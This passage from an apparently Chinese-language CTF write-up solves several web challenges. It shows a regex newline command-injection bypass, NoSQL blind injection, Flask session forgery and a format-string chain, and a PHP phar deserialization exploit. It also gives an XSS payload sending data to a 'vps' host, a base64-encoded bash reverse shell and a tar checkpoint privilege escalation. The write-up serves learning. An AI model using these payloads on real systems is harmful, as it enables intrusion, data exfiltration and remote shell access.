class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是限制了只能ip地址，但是使用了m修饰符后就不一样了，可以用<code>%0a</code>去绕过，原因是在<code>^</code>以及<code>$</code>之间会匹配换行之前和之后，只要是一个正确就会返回正确啦，第二轮的过滤，把<code>*</code>，<code>?</code>,<code>flag</code>给你过滤了，绕过我们可以使用<code>\</code>去绕过，官方题解用的单引号去绕过，都一样。。最后发包即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0ac\at /f\lag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsKX2n.png" alt="FsKX2n.png"></p><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>这个题目考的点是注入，又学到了23333，先是查看源代码发现先存在info.php，进去看看发现phpinfo的页面</p><p><img src="https://s1.ax1x.com/2018/12/21/Fsdk79.png" alt="Fsdk79.png"></p><p><a href="https://imgchr.com/i/FsdEkR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/FsdEkR.md.png" alt="FsdEkR.md.png"></a></p><p>phpinfo页面表明了开了mongo扩展，可以尝试一下NoSQL注入，这里官方给的wp好像是有一个可以带验证码识别的python脚本，有空得学学那个模块才行</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdrAs.png" alt="FsdrAs.png"></p><p>如果不正确的话显示的是上方的样子，正确的话会显示下方的样子，可以根据此来盲注</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdIE9.png" alt="FsdIE9.png"></p><p>最后注入的密码是skmun，用户是admin，登录就可以获得flag</p><h3 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h3><p>右键可以发现存在source目录，可以在里面找到下面的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure><p>然后可以利用这个点去读文件，但是里面不可以包含<code>..</code>也就是不能使用相对路径，只能使用绝对路径，可以读取文件</p><p><a href="https://imgchr.com/i/Fs0Mod" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/Fs0Mod.md.png" alt="Fs0Mod.md.png"></a></p><p>然后尝试读取<code>/proc/self/mounts</code>发现里面存在一个web目录，另外我们知道<code>/proc/[pid]/cwd</code>是进程当前工作目录的符号链接,可以从中读取文件内容，读取到了两个文件内容</p><p><strong>init</strong>.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>view.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>现在拥有了secret_key不难想到可以伪造session，但我们需要注意的是<code>u.balance</code>的值需要比1000000大，开始伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span></span><br><span class="line">secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line"></span><br><span class="line">s = SecureCookieSessionInterface().get_signing_serializer(App())</span><br><span class="line">u = s.loads(<span class="string">'.eJwVzDEOgzAQRNG7TE0xBiMWXyZar5cmwUgG0kS5O_CrV_0fsn60miMF3nWw7awH0qO9La9je3tFwhSFzOImZrFQfJpFGVnGuISQy6zUgSLocO7eqq73Evx6C_2A_wVSDx5s.XBzbDQ.TMK2zvIwmNUWxVCXYaJJU7aQzqo'</span>)</span><br><span class="line">u[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">u[<span class="string">'balance'</span>] = <span class="number">1000000000.0</span></span><br><span class="line">print(s.dumps(u))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw1zDsKw0AMRdG9vNqEN2SC5dlM0GhkCI5l8KcK2budIrc61f2g6lvDHCXx340dbDliR_lpW8fnvkweKOizkFXcxCw3iveDKDPbI48p1TYo9U4RdDg2X0Pn6wxt8yvwPQGtyx-w.XBzkcA.sDFRMVhq2AkzcCAeoHSjBM-_OSA</span><br></pre></td></tr></table></figure><p>接下来就是python格式化字符串的漏洞了，构造继承链，又学到了</p><p><img src="https://s1.ax1x.com/2018/12/21/FsyP8s.png" alt="FsyP8s.png"></p><p>最后的攻击链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsyWGj.png" alt="FsyWGj.png"></p><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p>拿到题目就发现url有些问题，猜测应该可以文件读取，可以查看file.php以及class.php</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面构造攻击链的过程又学到了。。。。可以读一下这篇文章:<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p>攻击的流程tql….，给我就不会构造学到了。。。</p><p>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.触发Test类的<code>__get()</code><br>5.成功利用<code>file_get()</code>读文件</p><p>这里就直接引用Smile大佬的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    <span class="string">'source'</span> =&gt; <span class="string">'/var/www/html/f1ag.php'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($c); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">copy(<span class="string">'phar.phar'</span>,<span class="string">'exp.gif'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后根据文件名以及ip地址推出MD5的文件名，然后再用phar协议读取即可，这里记得改一下php.ini里面的属性phar.readonly = Off</p><p>图片名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=phar://upload/0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>获得flag</p><p><img src="https://s1.ax1x.com/2018/12/21/FsREAf.png" alt="FsREAf.png"></p><h3 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h3><p>题目上来发现存在两个功能点，有一个admin.php还有一个check.php,但是admin.php只允许本地用户去读取，估计得用xss了。</p><p>可以从check.php里面的源码发现验证邮箱我们可以去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, please check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>构造源代码的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>构造的绕过payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure><p>监听端口，发现</p><p><img src="https://s1.ax1x.com/2018/12/21/Fs4AMQ.png" alt="Fs4AMQ.png"></p><p>解码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>说明可以执行命令，然后重新修改脚本，反弹webshell，就在这一步的是时候，他喵的，他喵的，题目挂了我还是学习一下巨佬们的骚思路吧，这里学习了执念于心大佬的思路，通过写sh文件去反弹shell，用的是base64写shell,利用了管道符然后重定向到一个文件里面，echo后面的内容就是你写的反弹shell语句<code>/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1</code>经过base64之后的语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvaXAvcG9ydCAwPCYxIDI+JjE=' | base64 -d &gt; /tmp/xjb.sh</span><br></pre></td></tr></table></figure><p>然后执行<code>/bin/bash /tmp/**.sh</code>即可，这题的骚操作在于利用tar去提权，可以参考这篇文章，执行以下几句话,应该是先上传这几个名字的文件，利用了tar顺便把文件名给执行了，然后实现你的目的，你的目的内容写在demo.sh里面即可，你可以以对方身份webshell也行，直接读取flag也行，学到了，2333，以前对LInux的提权还是不太熟悉的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint-action=exec=sh demo.sh</span><br><span class="line">--checkpoint=1</span><br><span class="line">demo.sh</span><br></pre></td></tr></table></figure><h2 id="小结一下漏洞点"><a href="#小结一下漏洞点" class="headerlink" title="小结一下漏洞点"></a>小结一下漏洞点</h2><ol><li>php位随机数爆破，得注意一下对应的版本是否正确才是用脚本去爆破，在有的时候还可以把随机数的格式换一下便于爆破</li><li>命令执行的绕过点，第一个是关于正则的m修饰符的小trick，用<code>%0a</code>去绕过，第二个就是就是对于整个单词如何进行切割绕过，可以用<code>\</code>以及单引号去绕过</li><li>NoSQL注入的过程，以及那个骚气的识别验证码的脚本，都是我薄弱的点，以后找个时间单独锻炼一下</li><li>python站的遇到secret_key就应该想到其中的一个思路就应该是构造session，还有python站的继承链的构造也是一个点，不太熟悉，也需要锻炼</li><li>看到file_exists这类的函数的时候应该有很好的意识去想到需要去用<code>phar</code>协议去测试一下，同样的里面的pop链构造也是自己薄弱的点，还得多加练习</li><li>这个邮箱注册绕过 FILTER_VALIDATE_EMAIL然后xss，攻击只有本地才能访问的local 